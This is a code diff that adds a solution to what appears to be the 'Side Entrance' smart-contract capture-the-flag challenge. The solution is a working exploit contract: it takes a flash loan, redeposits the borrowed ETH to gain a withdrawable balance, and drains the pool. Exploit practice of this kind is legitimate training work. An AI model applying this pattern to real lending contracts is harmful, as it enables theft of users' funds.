@@ -45,7 +45,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        FlashLoanEtherReceiver receiver = new FlashLoanEtherReceiver();
+        receiver.execute1(pool);
+        receiver.transfer(payable(recovery));
     }
 
     /**
@@ -54,5 +56,30 @@ contract SideEntranceChallenge is Test {
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
         assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+    }
+}
+
+
+contract FlashLoanEtherReceiver{
+    fallback() external payable{}
+    receive() external payable{}
+    SideEntranceLenderPool pool;
+    uint256 constant ETHER_IN_POOL = 1000e18;
+    function execute1(SideEntranceLenderPool _pool) external payable{
+        console.log("execute1");
+        pool = _pool;
+        pool.flashLoan(ETHER_IN_POOL);
+
+    }
+    function execute() external payable{
+        console.log("execute");
+        console.log(address(this).balance);
+        bytes memory callData = abi.encodeWithSelector(pool.deposit.selector);
+        address(pool).call{value:ETHER_IN_POOL}(callData);
+    }
+    function transfer(address payable recovery) external payable{
+        pool.withdraw();
+        console.log(address(this).balance);
+        recovery.transfer(address(this).balance);
     }
 }
